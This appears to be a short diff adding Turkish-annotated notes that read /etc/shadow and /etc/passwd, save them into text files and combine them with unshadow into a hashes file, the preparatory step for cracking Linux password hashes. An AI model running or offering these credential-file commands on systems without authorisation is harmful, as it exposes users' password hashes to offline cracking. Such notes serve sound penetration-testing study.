@@ -1,0 +1,12 @@
+
+cat /etc/shadow (kullanıcıların şifreli şifrelerinin bulunduğu kısmı okur)
+
+leafpad shadow.txt (alınan şifreleri bu txt dosyasının içine yaz)
+
+cat /etc/passwd (aynı işlem)
+
+leafpad passwd.txt (aynı işlem)
+
+unshadow shadow.txt passwd.txt > hashes.txt
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
